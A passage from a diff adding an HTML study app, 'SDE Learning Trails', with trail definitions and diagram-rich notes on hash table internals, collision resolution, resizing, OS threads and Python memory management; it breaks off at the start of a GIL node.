@@ -1,0 +1,3874 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SDE Learning Trails</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0d1117; --sidebar-bg: #161b22; --card-bg: #1c2128;
+      --border: #30363d; --text: #e6edf3; --muted: #8b949e;
+      --code-bg: #22272e; --done-bg: #1a2820;
+    }
+    html, body { height: 100%; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: var(--text); font-size: 14px; line-height: 1.6; }
+    #app { display: flex; height: 100vh; overflow: hidden; }
+
+    /* ── Sidebar ─────────────────────────────────────────── */
+    #sidebar { width: 264px; min-width: 264px; background: var(--sidebar-bg); border-right: 1px solid var(--border); display: flex; flex-direction: column; overflow: hidden; }
+    .sidebar-header { padding: 16px; border-bottom: 1px solid var(--border); flex-shrink: 0; }
+    .sidebar-header h1 { font-size: 15px; font-weight: 700; margin-bottom: 10px; }
+    .overall-bar { height: 4px; background: var(--border); border-radius: 2px; overflow: hidden; margin-bottom: 5px; }
+    .overall-fill { height: 100%; background: #3fb950; border-radius: 2px; transition: width .3s; }
+    .overall-label { font-size: 11px; color: var(--muted); }
+    #trail-list { flex: 1; overflow-y: auto; padding: 6px 0; }
+    .trail-item { padding: 9px 14px; cursor: pointer; border-left: 3px solid transparent; transition: background .12s; }
+    .trail-item:hover { background: rgba(255,255,255,.04); }
+    .trail-item.active { background: rgba(255,255,255,.06); border-left-color: var(--trail-color, #58a6ff); }
+    .trail-item-header { display: flex; align-items: center; gap: 8px; margin-bottom: 5px; }
+    .trail-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+    .trail-title { flex: 1; font-size: 12.5px; font-weight: 500; line-height: 1.35; }
+    .trail-count { font-size: 11px; color: var(--muted); white-space: nowrap; }
+    .trail-prog-bar { height: 2px; background: var(--border); border-radius: 1px; overflow: hidden; }
+    .trail-prog-fill { height: 100%; border-radius: 1px; transition: width .3s; }
+    .sidebar-footer { padding: 10px 14px; border-top: 1px solid var(--border); flex-shrink: 0; }
+    .sidebar-footer button { background: none; border: 1px solid var(--border); color: var(--muted); font-size: 11px; padding: 5px 10px; border-radius: 5px; cursor: pointer; width: 100%; transition: all .15s; }
+    .sidebar-footer button:hover { border-color: #f85149; color: #f85149; }
+
+    /* ── Main panel ──────────────────────────────────────── */
+    #main-panel { flex: 1; overflow-y: auto; padding: 28px 32px; }
+    .empty-state { color: var(--muted); text-align: center; margin-top: 120px; font-size: 15px; }
+    .trail-header { border-left: 4px solid; padding-left: 18px; margin-bottom: 22px; }
+    .trail-header h2 { font-size: 21px; font-weight: 700; margin-bottom: 6px; }
+    .trail-objective { color: var(--muted); font-size: 13px; margin-bottom: 8px; }
+    .trail-meta { display: flex; gap: 18px; font-size: 12px; color: var(--muted); }
+    .prereq-banner { background: #2d2208; border: 1px solid #7d5a00; border-radius: 6px; padding: 10px 14px; font-size: 13px; color: #d29922; margin-bottom: 20px; }
+    .prereq-banner a { color: #e3b341; text-decoration: underline; cursor: pointer; }
+    .nodes-list { display: flex; flex-direction: column; }
+    .node-wrap { display: flex; flex-direction: column; }
+    .node-card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 8px; transition: background .12s; }
+    .node-card.done { background: var(--done-bg); border-color: #2ea04366; }
+    .node-header { display: flex; align-items: center; gap: 12px; padding: 11px 16px; cursor: pointer; user-select: none; border-radius: 8px; }
+    .node-header:hover { background: rgba(255,255,255,.03); }
+    .node-num { font-size: 11px; font-weight: 700; color: var(--muted); width: 18px; text-align: center; flex-shrink: 0; }
+    .node-title-text { flex: 1; font-size: 13.5px; font-weight: 500; }
+    .node-chevron { font-size: 9px; color: var(--muted); transition: transform .15s; }
+    .node-chevron.open { transform: rotate(180deg); }
+    .node-check { width: 15px; height: 15px; cursor: pointer; accent-color: #3fb950; flex-shrink: 0; }
+    .node-content { padding: 2px 16px 16px 46px; border-top: 1px solid var(--border); }
+    .bridge-note { margin: 6px 0 6px 34px; padding: 5px 12px; font-size: 12px; color: #6e7681; font-style: italic; border-left: 2px solid var(--border); line-height: 1.5; }
+    .trail-footer { margin-top: 28px; padding-top: 16px; border-top: 1px solid var(--border); }
+    .trail-footer button { background: none; border: 1px solid var(--border); color: var(--muted); font-size: 12px; padding: 6px 14px; border-radius: 6px; cursor: pointer; transition: all .15s; }
+    .trail-footer button:hover { background: rgba(255,255,255,.04); border-color: #58a6ff; color: #58a6ff; }
+
+    /* ── Node content elements ───────────────────────────── */
+    .node-content .no-content { color: var(--muted); font-style: italic; font-size: 13px; padding: 8px 0; }
+    .node-content h3 { font-size: 13px; font-weight: 700; color: #79c0ff; margin: 14px 0 5px; }
+    .node-content h4 { font-size: 12.5px; font-weight: 600; color: #9ecbff; margin: 10px 0 4px; }
+    .node-content p { font-size: 13px; color: var(--muted); margin: 5px 0; line-height: 1.65; }
+    .node-content ul, .node-content ol { margin: 5px 0 5px 18px; }
+    .node-content li { font-size: 13px; color: var(--muted); margin: 3px 0; line-height: 1.55; }
+    .node-content li strong, .node-content p strong { color: var(--text); }
+    .node-content code { font-family: 'SF Mono','Cascadia Code','Fira Code',monospace; font-size: 11.5px; background: var(--code-bg); padding: 1px 5px; border-radius: 3px; color: #f78166; }
+    .node-content pre { font-family: 'SF Mono','Cascadia Code','Fira Code',monospace; font-size: 11.5px; line-height: 1.55; background: var(--code-bg); border: 1px solid var(--border); border-radius: 6px; padding: 12px 14px; overflow-x: auto; color: #79c0ff; margin: 8px 0; white-space: pre; }
+    .node-content table { width: 100%; border-collapse: collapse; margin: 8px 0; font-size: 12px; }
+    .node-content th { background: var(--code-bg); color: var(--text); padding: 6px 10px; text-align: left; border: 1px solid var(--border); font-weight: 600; white-space: nowrap; }
+    .node-content td { padding: 5px 10px; border: 1px solid var(--border); color: var(--muted); vertical-align: top; line-height: 1.5; }
+    .node-content tr:nth-child(even) td { background: rgba(255,255,255,.02); }
+
+    /* ── Side-by-side compare layout ─────────────────────── */
+    .node-content .compare { display: flex; gap: 14px; margin: 8px 0; }
+    .node-content .compare > div { flex: 1; min-width: 0; }
+    .node-content .compare > div > h4 { font-size: 11px; font-weight: 600; color: var(--muted); margin-bottom: 5px; text-transform: uppercase; letter-spacing: .05em; }
+    .node-content .compare pre { margin: 0; font-size: 11px; }
+
+    /* ── Callout boxes ────────────────────────────────────── */
+    .node-content .info  { background: rgba(88,166,255,.08); border-left: 3px solid #58a6ff; padding: 8px 12px; margin: 8px 0; border-radius: 0 4px 4px 0; font-size: 13px; color: var(--muted); }
+    .node-content .warn  { background: rgba(210,153,34,.08);  border-left: 3px solid #d29922;  padding: 8px 12px; margin: 8px 0; border-radius: 0 4px 4px 0; font-size: 13px; color: var(--muted); }
+    .node-content .good  { background: rgba(63,185,80,.08);   border-left: 3px solid #3fb950;  padding: 8px 12px; margin: 8px 0; border-radius: 0 4px 4px 0; font-size: 13px; color: var(--muted); }
+
+    /* ── Scrollbar ────────────────────────────────────────── */
+    ::-webkit-scrollbar { width: 5px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+    @media (max-width: 720px) {
+      #app { flex-direction: column; }
+      #sidebar { width: 100%; min-width: unset; height: auto; max-height: 38vh; }
+      #main-panel { padding: 16px; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ═══════════════════════════════════════════════════════════════
+  TRAIL DEFINITIONS
+  Each <template data-type="trail"> defines one trail.
+  LLM: to add a trail, append a new trail template here.
+  Attributes:
+    id              unique trail id (trail-NN)
+    data-order      display order (integer)
+    data-title      trail name shown in sidebar
+    data-objective  one-sentence learning goal
+    data-prereqs    comma-separated trail ids, or empty string
+    data-color      hex accent colour
+    data-review-time estimated reading time
+═══════════════════════════════════════════════════════════════ -->
+
+<template id="trail-01" data-type="trail" data-order="1"
+  data-title="Data Structures &amp; Hashing"
+  data-objective="Understand hash tables from first principles — why the two-step pipeline exists, how collisions are resolved, and what each strategy costs."
+  data-prereqs="" data-color="#e8a838" data-review-time="~30 min"></template>
+
+<template id="trail-02" data-type="trail" data-order="2"
+  data-title="Python Runtime &amp; Concurrency"
+  data-objective="Understand how Python actually executes your code — from hardware threads to async coroutines — so concurrency bugs stop being mysterious."
+  data-prereqs="" data-color="#3572A5" data-review-time="~50 min"></template>
+
+<template id="trail-03" data-type="trail" data-order="3"
+  data-title="Node.js Runtime"
+  data-objective="Understand how Node.js achieves high concurrency on a single thread, and where its model breaks down."
+  data-prereqs="trail-02" data-color="#68A063" data-review-time="~20 min"></template>
+
+<template id="trail-04" data-type="trail" data-order="4"
+  data-title="Networking"
+  data-objective="Trace the full path of a web request — from URL to pixels — and understand every protocol layer it passes through."
+  data-prereqs="" data-color="#0ea5e9" data-review-time="~30 min"></template>
+
+<template id="trail-05" data-type="trail" data-order="5"
+  data-title="Backend Architecture"
+  data-objective="Build a vocabulary of backend architectural patterns and understand how the frameworks you use every day implement them."
+  data-prereqs="trail-04" data-color="#8b5cf6" data-review-time="~40 min"></template>
+
+<template id="trail-06" data-type="trail" data-order="6"
+  data-title="Databases &amp; Storage"
+  data-objective="Understand how databases store, find, and replicate data — from query planner to wire protocol — so you can reason about persistence trade-offs from first principles."
+  data-prereqs="trail-05" data-color="#0d6efd" data-review-time="~50 min"></template>
+
+<template id="trail-07" data-type="trail" data-order="7"
+  data-title="Scaling &amp; Distributed Systems"
+  data-objective="Learn the toolbox for taking a system from one server to handles-anything — load balancing, messaging, caching, and the architecture of extreme scale."
+  data-prereqs="trail-06,trail-04" data-color="#10b981" data-review-time="~35 min"></template>
+
+<template id="trail-08" data-type="trail" data-order="8"
+  data-title="System Design"
+  data-objective="Practice the end-to-end skill of designing large-scale systems — from requirements to architecture — using increasingly complex case studies."
+  data-prereqs="trail-07" data-color="#ef4444" data-review-time="~35 min"></template>
+
+<template id="trail-09" data-type="trail" data-order="9"
+  data-title="DevOps &amp; Infrastructure"
+  data-objective="Understand how modern software gets built, packaged, and deployed automatically and reliably."
+  data-prereqs="trail-05" data-color="#f97316" data-review-time="~20 min"></template>
+
+<template id="trail-10" data-type="trail" data-order="10"
+  data-title="Frontend"
+  data-objective="Understand the modern frontend stack from rendering strategy to state management to performance."
+  data-prereqs="trail-04" data-color="#ec4899" data-review-time="~20 min"></template>
+
+<template id="trail-11" data-type="trail" data-order="11"
+  data-title="Security"
+  data-objective="Understand the most common web attack vectors and the defenses against them — from injection to auth flaws to real-world exploits."
+  data-prereqs="trail-04,trail-05" data-color="#dc2626" data-review-time="~20 min"></template>
+
+<template id="trail-12" data-type="trail" data-order="12"
+  data-title="AI &amp; Modern Stack"
+  data-objective="Understand how LLMs work, how to make them domain-specific, and how to build production agent systems."
+  data-prereqs="trail-05" data-color="#a855f7" data-review-time="~35 min"></template>
+
+<!-- ═══════════════════════════════════════════════════════════════
+  NODE TEMPLATES
+  Each <template data-type="node"> holds one node's content as HTML.
+  LLM instructions:
+    - To ADD a node: append a new template here, update data-bridge on
+      the previous last node of that trail (was empty), and set this
+      node's data-bridge to empty (it is now last).
+    - To EDIT content: find template by id, rewrite innerHTML.
+    - Content format: use <h3>, <h4>, <ul>/<li>, <ol>/<li>, <pre>,
+      <table>, <strong>, <code>, <p>. For side-by-side use
+      <div class="compare"><div><h4>A</h4>...</div><div><h4>B</h4>...
+      </div></div>. For callouts: <div class="info|warn|good">.
+  Attributes:
+    id            node-XX-YY (trail num + position)
+    data-type     "node"
+    data-trail    parent trail id
+    data-order    position within trail (integer)
+    data-title    node title
+    data-file     source note path relative to SDE Concepts/
+    data-bridge   transition sentence to next node (omit on last node)
+═══════════════════════════════════════════════════════════════ -->
+
+<!-- Trail 01: Data Structures & Hashing -->
+<template id="node-01-01" data-type="node" data-trail="trail-01" data-order="1"
+  data-title="Internal Structure of a Hash Table"
+  data-file="Hashing Internals/Internal Structure of a Hash Table.md"
+  data-bridge="The hash table structure depends on two steps — hash function and modulo — but this immediately creates collisions. Chaining resolves them by turning each array slot into a linked list of all colliding keys.">
+<h3>The Two-Step Pipeline</h3>
+<pre>
+key "user_42"
+     │
+     ▼  h("user_42") = 2,849,412,091
+┌─────────────────┐
+│  hash function   │   Step 1: any key → INT32 (0 to ~4.29 billion)
+└─────────────────┘
+     │ 2849412091 % 8 = 3
+     ▼
+  ┌───┬───┬───┬───┬───┬───┬───┬───┐
+  │ 0 │ 1 │ 2 │ 3 │ 4 │ 5 │ 6 │ 7 │   Step 2: INT32 → small array index
+  └───┴───┴───┴───┴───┴───┴───┴───┘
+              ▲
+        KV pair stored here</pre>
+<ul>
+  <li><strong>Step 1 — hash function</strong>: maps any key to INT32 range via <code>__hash__()</code> (Python) / <code>hashCode()</code> (Java)</li>
+  <li><strong>Step 2 — modulo</strong>: compresses INT32 to a valid index: <code>index = hash_key % array_length</code></li>
+</ul>
+<h3>Why Two Steps? The Memory Problem</h3>
+<div class="compare">
+  <div><h4>Naive (broken)</h4><pre>4.29 billion slots × 4 bytes
+= ~16 GB RAM
+Almost entirely empty</pre></div>
+  <div><h4>Practical (correct)</h4><pre>Array ∝ keys inserted
+Modulo compresses the range
+A few bytes of memory ✓</pre></div>
+</div>
+<h3>Load Factor and Dynamic Resizing</h3>
+<pre>
+Before resize (LF = 2/4 = 0.5 → threshold hit!):
+  ┌──────┬──────┬──────┬──────┐
+  │ a:1  │      │ b:2  │      │
+  └──────┴──────┴──────┴──────┘
+
+After 2× resize (LF = 2/8 = 0.25 → healthy):
+  ┌──────┬──────┬──────┬──────┬──────┬──────┬──────┬──────┐
+  │      │ a:1  │ b:2  │      │      │      │      │      │
+  └──────┴──────┴──────┴──────┴──────┴──────┴──────┴──────┘
+  ↑ keys are REHASHED — indices change after resize</pre>
+<ul>
+  <li><strong>Load factor</strong> = keys/slots; grow at LF ≥ 0.5, shrink at LF ≤ 0.125</li>
+  <li>Asymmetric thresholds prevent thrashing (grow then immediately shrink)</li>
+  <li>Doubling is amortized O(1) per insert — same analysis as Python <code>list.append()</code></li>
+  <li>Collisions are inevitable — you are mapping 4.29B → small array. Two resolution strategies: Chaining and Open Addressing</li>
+</ul>
+</template>
+
+<template id="node-01-02" data-type="node" data-trail="trail-01" data-order="2"
+  data-title="Conflict Resolution with Chaining"
+  data-file="Hashing Internals/Conflict Resolution in Hash Tables with Chaining.md"
+  data-bridge="Chaining uses external linked lists, which means pointer overhead and poor cache locality. Open addressing eliminates auxiliary structures entirely — all keys live in the flat array, found by probing for the next available slot.">
+<h3>Array of Linked Lists</h3>
+<pre>
+ index   slot
+ ─────   ────────────────────────────────────────────────
+  [0]  ──► "dave":4  → NULL
+  [1]  ──► NULL
+  [2]  ──► "alice":1  →  "bob":2  → NULL
+             ↑ both hashed to slot 2 (collision!)
+  [3]  ──► NULL
+  [4]  ──► "carol":3  → NULL</pre>
+<h3>Insert: Always Prepend to Head — O(1)</h3>
+<pre>
+  Insert "eve" where h("eve") % 8 = 2:
+
+  Before: [2] → alice:1 → bob:2 → NULL
+  After:  [2] → eve:5 → alice:1 → bob:2 → NULL
+                ↑ new node prepended — no traversal needed</pre>
+<div class="warn">Lookup must compare <strong>actual keys</strong>, not just hash values — two different keys CAN produce the same hash. Each node also stores the pre-computed <code>hash_key</code> INT32 so the cheap integer comparison runs before the expensive string comparison.</div>
+<h3>Upgrade to BST for Long Chains</h3>
+<div class="compare">
+  <div><h4>Linked list (O(n))</h4><pre>alice → bob → carol
+  → dave → eve
+  (linear scan)</pre></div>
+  <div><h4>Red-Black tree (O(log n))</h4><pre>      carol
+     /     \
+   bob    dave
+   /         \
+alice        eve</pre></div>
+</div>
+<p>Java 8 HashMap converts at <strong>TREEIFY_THRESHOLD = 8 entries</strong>; reverts at 6.</p>
+<table>
+  <thead><tr><th>Operation</th><th>Linked list</th><th>BST / Red-Black</th></tr></thead>
+  <tbody>
+    <tr><td>Insert</td><td>O(1) prepend</td><td>O(log n)</td></tr>
+    <tr><td>Lookup</td><td>O(n) worst, O(1) avg</td><td>O(log n)</td></tr>
+    <tr><td>Delete</td><td>O(n) to find</td><td>O(log n)</td></tr>
+  </tbody>
+</table>
+<ul>
+  <li><strong>Extra memory</strong>: each node needs a <code>next</code> pointer (8 bytes on 64-bit) + heap allocation overhead</li>
+  <li><strong>Poor cache locality</strong>: list nodes scattered across heap; CPU prefetcher cannot predict next address</li>
+  <li>LF can exceed 1.0 — table never hard-full; real deletes (no tombstones needed)</li>
+</ul>
+</template>
+
+<template id="node-01-03" data-type="node" data-trail="trail-01" data-order="3"
+  data-title="Conflict Resolution with Open Addressing"
+  data-file="Hashing Internals/Conflict Resolution in Hash Tables with Open Addressing.md"
+  data-bridge="Open addressing needs a probing function to find the next available slot. Three strategies exist, each trading off between clustering and CPU cache efficiency.">
+<h3>All Keys Live in the Array Itself</h3>
+<div class="compare">
+  <div><h4>Chaining</h4><pre>[0] → linked list
+[1] → linked list
+[2] → linked list
+uses extra heap memory</pre></div>
+  <div><h4>Open Addressing</h4><pre>[0]  EMPTY
+[1]  key A  (primary)
+[2]  key B  (collided → probed)
+[3]  EMPTY
+all KV pairs in the array ✓</pre></div>
+</div>
+<h3>Three Slot States</h3>
+<pre>
+  ┌───────────┐  EMPTY    — never occupied
+  │           │            probe STOPS here (key definitely not in table)
+  └───────────┘
+
+  ┌───────────┐  OCCUPIED — holds a live key-value pair
+  │  key:val  │
+  └───────────┘
+
+  ┌───────────┐  DELETED  — tombstone (soft-removed)
+  │   ~~~     │            probe SKIPS and keeps going
+  └───────────┘</pre>
+<h3>Why Soft Delete (Not Hard Delete)?</h3>
+<pre>
+  Step 1: Insert A at slot 3; B collides → probes to slot 4
+    [ ][ ][ ][ A ][ B ][ ]
+
+  Hard-delete A → slot 3 = EMPTY:
+    [ ][ ][ ][   ][ B ][ ]
+
+  Lookup B: hash(B) = 3 → slot 3 is EMPTY → STOP ✗
+  B is at slot 4 but we never reach it!
+
+  ─────────────────────────────────────────────────────────────
+  Soft-delete A → slot 3 = DELETED:
+    [ ][ ][ ][ ~~ ][ B ][ ]
+
+  Lookup B: slot 3 = DELETED → skip → slot 4 = B ✓</pre>
+<ul>
+  <li>Python <code>dict</code> uses open addressing; <code>del d[key]</code> is a soft delete internally</li>
+  <li>Max LF &lt; 1.0 (hard cap at array size, unlike chaining)</li>
+  <li>Tombstones accumulate; they are cleaned up during a resize (not copied to new array)</li>
+</ul>
+</template>
+
+<template id="node-01-04" data-type="node" data-trail="trail-01" data-order="4"
+  data-title="Linear, Quadratic, and Double Hashing"
+  data-file="Hashing Internals/Conflict Resolution- Linear, Quadratic and Double Hashing.md"
+  data-bridge="The three probing strategies complete the picture of collision resolution. Now zoom into the resize event itself: the exact cost proof that makes doubling O(1) amortized, and the bitwise trick that makes power-of-two array sizes faster than plain modulo.">
+<h3>Linear Probing — <code>p(k,i) = (h(k) + i) mod m</code></h3>
+<pre>
+  Collision at slot 2, table size 8:
+  i=0: try slot 2 (occupied!)
+  i=1: try slot 3 (occupied!)
+  i=2: try slot 4 (free → insert)
+  Probe path: 2, 3, 4 — sequential = cache-friendly ✓
+
+  PRIMARY CLUSTERING PROBLEM:
+  [ ][ ][X][X][X][X][ ][ ]
+        2  3  4  5
+  Any key hashing to 2–5 extends this block further</pre>
+<h3>Quadratic Probing — <code>p(k,i) = (h(k) + c1·i + c2·i²) mod m</code></h3>
+<pre>
+  Offsets grow: +1, +4, +9, +16...
+  Breaks primary clustering ✓
+  Secondary clustering remains: same primary hash → same quadratic path</pre>
+<h3>Double Hashing — <code>p(k,i) = (h1(k) + i·h2(k)) mod m</code></h3>
+<pre>
+  Key A: h1=3, h2=5  → probes: 3, 8, 13, 18...
+  Key B: h1=3, h2=3  → probes: 3, 6,  9, 12...
+                              ↑
+  Same primary slot, different step — immediately diverge ✓
+  h2(k) must never return 0 (infinite loop on primary slot)</pre>
+<table>
+  <thead><tr><th>Strategy</th><th>Formula</th><th>Clustering</th><th>Cache</th><th>Cost</th></tr></thead>
+  <tbody>
+    <tr><td>Linear</td><td>h(k) + i</td><td>Primary (worst)</td><td>Best ★★★</td><td>1 hash</td></tr>
+    <tr><td>Quadratic</td><td>h(k) + c1·i + c2·i²</td><td>Secondary</td><td>OK ★★</td><td>1 hash + math</td></tr>
+    <tr><td>Double</td><td>h1(k) + i·h2(k)</td><td>None (best)</td><td>Poor ★</td><td>2 hashes</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-01-05" data-type="node" data-trail="trail-01" data-order="5"
+  data-title="Hash Table Resizing and Optimizations"
+  data-file="Hashing Internals/Hash Table Resizing and Optimizations.md"
+  data-bridge="">
+<h3>The Resize Event: Three Stages</h3>
+<pre>
+  Stage 1 — ALLOCATE:
+    OS allocates a new contiguous block of size 2 × M_old
+
+  Stage 2 — REHASH + COPY:
+    For every key: new_index = hash(key) % M_new  ← must re-run!
+    Cannot use realloc() — M changed, so every index changes
+
+  Stage 3 — DEALLOCATE:
+    Free the old array</pre>
+<h3>Why +1 Growth Is O(N²)</h3>
+<pre>
+  Insert 1st: 1 op | Insert 2nd: 2 ops | ... | Insert Nth: N ops
+  Total = 1+2+...+N = N(N+1)/2 = O(N²)  ← catastrophic</pre>
+<h3>Why Doubling Is O(1) Amortized</h3>
+<pre>
+  After doubling to size N (N/2 keys occupy the left half):
+
+  N/2 - 1 easy inserts:   each O(1)  (empty slots available)
+  Final insert triggers resize to 2N:
+    allocate 2N  → 2N ops
+    rehash all N → N  ops
+  ───────────────────────────────────────────────────────────
+  Total = (N/2 - 1) + 1 + 2N + N = 7N/2 - 1 = O(N)
+  Amortized per insert = O(N) / N = O(1) ✓</pre>
+<h3>Bitwise AND — Why Array Sizes Are Powers of Two</h3>
+<pre>
+  Standard:  index = hash(key) % M        ← CPU integer division (slow)
+  Optimized: index = hash(key) &amp; (M - 1)  ← single CPU instruction (fast)
+
+  Works because M-1 in binary has all lower bits as 1:
+    M=4  →  M-1 = 3  = 0011
+    M=8  →  M-1 = 7  = 0111
+    M=16 →  M-1 = 15 = 1111
+  AND isolates exactly those lower bits = same as modulo, free</pre>
+<table>
+  <thead><tr><th>Key</th><th>hash % 4</th><th>binary: key &amp; 0011</th><th>Result</th></tr></thead>
+  <tbody>
+    <tr><td>1</td><td>1</td><td>0001 &amp; 0011 = 0001</td><td>1</td></tr>
+    <tr><td>4</td><td>0</td><td>0100 &amp; 0011 = 0000</td><td>0</td></tr>
+    <tr><td>5</td><td>1</td><td>0101 &amp; 0011 = 0001</td><td>1</td></tr>
+  </tbody>
+</table>
+<h3>Shrink at LF = 1/8, Not LF = 1/4 — Avoiding Thrashing</h3>
+<pre>
+  Shrink at LF=0.25:  16 slots, 4 keys → shrink to 8
+  After shrink: 4/8 = 0.50 → RIGHT AT grow threshold!
+  One insert → grow back to 16 → one delete → shrink again
+  Every operation triggers a resize! ✗
+
+  Shrink at LF=0.125: 16 slots, 2 keys → shrink to 8
+  After shrink: 2/8 = 0.25 → buffer of ~2 inserts before next grow ✓</pre>
+<table>
+  <thead><tr><th>Property</th><th>+1 Growth</th><th>Doubling (×2)</th></tr></thead>
+  <tbody>
+    <tr><td>Time complexity</td><td>O(N²)</td><td>O(1) amortized</td></tr>
+    <tr><td>Grow trigger</td><td>Every insert</td><td>LF = 0.5</td></tr>
+    <tr><td>Shrink trigger</td><td>Every delete</td><td>LF = 0.125</td></tr>
+    <tr><td>Index computation</td><td><code>hash % M</code> (slow)</td><td><code>hash &amp; (M-1)</code> (fast)</td></tr>
+  </tbody>
+</table>
+</template>
+
+<!-- Trail 02: Python Runtime & Concurrency -->
+<template id="node-02-01" data-type="node" data-trail="trail-02" data-order="1"
+  data-title="OS Scheduling, Processes and Threads"
+  data-file="Python/OS Scheduling, Process and Threads.md"
+  data-bridge="The OS gives you processes and threads at the hardware level. Now zoom into Python's runtime — every variable is a heap reference, and how Python manages that allocation model directly motivates why the GIL exists.">
+<h3>12-Core CPU (No Hyper-Threading)</h3>
+<pre>
+  Core 0   Core 1   Core 2  ...  Core 11
+  ──────   ──────   ──────       ───────
+  Thread   Thread   Thread  ...  Thread
+    A        B        C            L
+
+  12 physical = 12 logical = 12 truly simultaneous threads
+  (With SMT: 6 cores × 2 logical = 12, but share execution units)</pre>
+<h3>Process vs Thread</h3>
+<div class="compare">
+  <div><h4>Process (heavyweight)</h4><pre>own heap
+own stack
+own code segment
+own registers
+─────────────────
+isolated — crash
+stays contained</pre></div>
+  <div><h4>Thread (lightweight)</h4><pre>shared heap ◄─────┐
+                   │
+own stack          │
+own registers      │
+─────────────────  │
+Thread 2 (same ───┘
+process) sees
+shared memory!</pre></div>
+</div>
+<table>
+  <thead><tr><th></th><th>Process</th><th>Thread</th></tr></thead>
+  <tbody>
+    <tr><td>Memory</td><td>Isolated (own address space)</td><td>Shared (heap + code shared, own stack)</td></tr>
+    <tr><td>Creation cost</td><td>High (copy address space)</td><td>Low (share address space)</td></tr>
+    <tr><td>Context switch</td><td>Slow (full memory context)</td><td>Fast (just registers + stack)</td></tr>
+    <tr><td>Crash isolation</td><td>Yes</td><td>No</td></tr>
+  </tbody>
+</table>
+<h3>OS Schedulers</h3>
+<table>
+  <thead><tr><th>Scheduler</th><th>OS</th><th>Algorithm</th></tr></thead>
+  <tbody>
+    <tr><td>CFS</td><td>Linux</td><td>Red-Black tree; always runs thread with least virtual runtime</td></tr>
+    <tr><td>MLFQ</td><td>Windows / macOS</td><td>Multi-level queues; I/O-bound stays high-priority, CPU-hog demoted</td></tr>
+  </tbody>
+</table>
+<h3>User-Level vs Kernel-Level Threads</h3>
+<table>
+  <thead><tr><th></th><th>User-level (green)</th><th>Kernel-level</th></tr></thead>
+  <tbody>
+    <tr><td>Managed by</td><td>Runtime library</td><td>OS</td></tr>
+    <tr><td>Context switch</td><td>Fast (no syscall)</td><td>Slower (syscall required)</td></tr>
+    <tr><td>If one blocks</td><td>Entire process blocks</td><td>Only that thread blocks</td></tr>
+  </tbody>
+</table>
+<h3>Concurrency Strategies</h3>
+<table>
+  <thead><tr><th>Strategy</th><th>Mechanism</th><th>Best for</th><th>Analogy</th></tr></thead>
+  <tbody>
+    <tr><td>asyncio</td><td>1 thread + event loop, programmer yields via <code>await</code></td><td>High-volume non-blocking I/O</td><td>1 chef, many pots</td></tr>
+    <tr><td>ThreadPool</td><td>Many kernel threads, OS-managed</td><td>Blocking sync or legacy code</td><td>Many chefs, shared kitchen</td></tr>
+    <tr><td>Multiprocessing</td><td>Separate processes (own GIL + memory)</td><td>CPU-bound parallelism</td><td>Many chefs, separate kitchens</td></tr>
+  </tbody>
+</table>
+<div class="info"><strong>FastAPI rule:</strong> <code>async def</code> routes run on the event loop; <code>def</code> (sync) routes are automatically sent to a thread pool.</div>
+</template>
+
+<template id="node-02-02" data-type="node" data-trail="trail-02" data-order="2"
+  data-title="Memory Allocation and Management in Python"
+  data-file="Python/Memory Allocation and Management in Python.md"
+  data-bridge="Reference counts are shared heap state that multiple threads would corrupt without protection. The GIL is that protection — this note explains the cost and your workarounds.">
+<h3>Variables Are References, Not Values</h3>
+<pre>
+  x = [1, 2, 3]
+  y = x          ← both names point to the SAME object
+
+     STACK                 HEAP
+  ────────────         ───────────────────────────
+  │ x ──────────────► │  list [1, 2, 3]  refcount=2 │
+  │ y ──────────────► │  (same object)              │
+  ────────────         ───────────────────────────
+
+  y.append(4)  → list becomes [1, 2, 3, 4]
+  print(x)     → [1, 2, 3, 4]  ← x sees the same change!</pre>
+<h3>Reference Counting</h3>
+<pre>
+  obj = MyClass()    refcount = 1
+  alias = obj        refcount = 2
+  del obj            refcount = 1
+  del alias          refcount = 0  → freed immediately ✓
+
+  CYCLE (refcounting can't handle):
+  a = []; a.append(a)   ← a → list → a → list → ∞
+  del a    refcount drops to 1, not 0  → Cyclic GC handles this</pre>
+<h3>Three Levels of Copying</h3>
+<pre>
+  original = [ [1, 2], [3, 4] ]
+
+  ASSIGNMENT  b = a
+    b ──► same list object (alias)
+    b[0].append(99) changes original[0] too ✗
+
+  SHALLOW COPY  b = copy.copy(a)
+    b ──► NEW outer list
+            ├──► [1, 2]  ← SAME inner list (shared!)
+            └──► [3, 4]  ← SAME inner list (shared!)
+    b[0].append(99) still changes original[0] ✗
+
+  DEEP COPY  b = copy.deepcopy(a)
+    b ──► NEW outer list
+            ├──► [1, 2]  ← brand new copy
+            └──► [3, 4]  ← brand new copy
+    fully independent ✓</pre>
+<table>
+  <thead><tr><th>Method</th><th>Syntax</th><th>New container?</th><th>New nested items?</th><th>Use when</th></tr></thead>
+  <tbody>
+    <tr><td>Assignment</td><td><code>b = a</code></td><td>No</td><td>No</td><td>Intentional alias</td></tr>
+    <tr><td>Shallow copy</td><td><code>copy.copy(a)</code></td><td>Yes</td><td>No</td><td>Flat structures only</td></tr>
+    <tr><td>Deep copy</td><td><code>copy.deepcopy(a)</code></td><td>Yes</td><td>Yes</td><td>Nested mutable structures</td></tr>
+  </tbody>
+</table>
+<ul>
+  <li><strong>Immutable types</strong> (<code>int</code>, <code>str</code>, <code>tuple</code>): shallow copy is safe — they can't be mutated in-place</li>
+  <li>Small int cache: -5 to 256 pre-allocated as singletons — <code>a = 5; b = 5; a is b</code> → True</li>
+  <li><code>is</code> checks object identity (same heap address); <code>==</code> checks value equality</li>
+  <li>Weak references (<code>weakref.ref(obj)</code>): don't increment refcount — let object be collected</li>
+</ul>
+</template>
+
+<template id="node-02-03" data-type="node" data-trail="trail-02" data-order="3"
+  data-title="GIL, Threads and Processes"
+  data-file="Python/GIL, Threads and Processes.md"
